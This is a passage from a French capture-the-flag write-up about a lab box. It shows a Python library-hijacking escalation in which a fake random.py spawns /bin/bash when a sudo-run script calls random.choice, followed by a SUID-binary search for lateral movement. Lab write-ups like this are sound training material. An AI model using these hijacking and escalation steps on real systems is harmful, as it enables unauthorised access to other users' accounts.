&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;If this were only cleared away,&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;They said, &amp;#34;it would be grand!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;If seven maids with seven mops
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Swept it for half a year,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Do you suppose,&amp;#34; the Walrus said,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;That they could get it clear?&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I doubt it,&amp;#34; said the Carpenter,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And shed a bitter tear.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;O Oysters, come and walk with us!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Walrus did beseech.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A pleasant walk, a pleasant talk,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Along the briny beach:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;We cannot do with more than four,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;To give a hand to each.&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The eldest Oyster looked at him.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;But never a word he said:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The eldest Oyster winked his eye,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And shook his heavy head ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Meaning to say he did not choose
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;To leave the oyster-bed.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;But four young oysters hurried up,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;All eager for the treat:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Their coats were brushed, their faces washed,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Their shoes were clean and neat ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And this was odd, because, you know,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;They hadn‚Äôt any feet.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Four other Oysters followed them,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And yet another four;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And thick and fast they came at last,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And more, and more, and more ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;All hopping through the frothy waves,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And scrambling to the shore.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Walrus and the Carpenter
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Walked on a mile or so,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And then they rested on a rock
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Conveniently low:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And all the little Oysters stood
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And waited in a row.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The time has come,&amp;#34; the Walrus said,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;To talk of many things:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Of shoes ‚Äî and ships ‚Äî and sealing-wax ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Of cabbages ‚Äî and kings ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And why the sea is boiling hot ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And whether pigs have wings.&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;But wait a bit,&amp;#34; the Oysters cried,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Before we have our chat;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;For some of us are out of breath,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And all of us are fat!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No hurry!&amp;#34; said the Carpenter.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;They thanked him much for that.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A loaf of bread,&amp;#34; the Walrus said,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Is what we chiefly need:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Pepper and vinegar besides
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Are very good indeed ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Now if you‚Äôre ready Oysters dear,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;We can begin to feed.&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;But not on us!&amp;#34; the Oysters cried,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Turning a little blue,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;After such kindness, that would be
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A dismal thing to do!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The night is fine,&amp;#34; the Walrus said
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Do you admire the view?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It was so kind of you to come!
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And you are very nice!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Carpenter said nothing but
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cut us another slice:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I wish you were not quite so deaf ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I‚Äôve had to ask you twice!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It seems a shame,&amp;#34; the Walrus said,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;To play them such a trick,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;After we‚Äôve brought them out so far,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And made them trot so quick!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Carpenter said nothing but
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The butter‚Äôs spread too thick!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I weep for you,&amp;#34; the Walrus said.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I deeply sympathize.&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;With sobs and tears he sorted out
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Those of the largest size.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Holding his pocket handkerchief
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Before his streaming eyes.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;O Oysters,&amp;#34; said the Carpenter.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You‚Äôve had a pleasant run!
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Shall we be trotting home again?&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;But answer came there none ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And that was scarcely odd, because
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;They‚Äôd eaten every one.&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;choice(poem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The line was:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, line)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le code donne envie de vomir mais bon‚Ä¶ il y a un&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;puis la fonction &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;random.choice&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; est appel√©e √† la fin du code&lt;/p&gt;
&lt;p&gt;On part donc sur une &lt;strong&gt;library hijacking&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;On cr√©e un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;random.py&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans le m√™me dossier que le script, dans lequel on met ce code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; os &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;choice&lt;/span&gt;(x):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Puis on le lance en tant que rabbit&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Puisqu‚Äôil existe un fichier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;random&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans le m√™me dossier que le script qui a √©t√© lanc√©, il importera le fichier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;random&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; et non la lib comme il devrait le faire, notre code sera donc lu et un nouveau shell se cr√©era en tant que &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;rabbit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729307-1513e4be-f494-4d10-ab4d-133226d3dc2c.png&#34; alt=&#34;2022-12-14-191319_999x197_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;lateral-move-rabbit--hatter&#34;&gt;Lateral move (rabbit ‚Üí hatter)&lt;/h1&gt;
&lt;p&gt;Maintenant qu‚Äôon est &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;rabbit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, il faut trouver un nouveau vecteur de &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;privesc&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Puisque nous n‚Äôavons pas le mot de passe de l‚Äôutilisateur, nous ne pouvons pas utiliser de commandes &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On va donc tenter de voir si certains &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;executables&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; ont les permissions &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;setuid&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è find / -user root -perm -4000 -exec ls -ldb {} \; &amp;gt; /tmp/results&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;sr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;16816&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;rabbit&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;teaParty
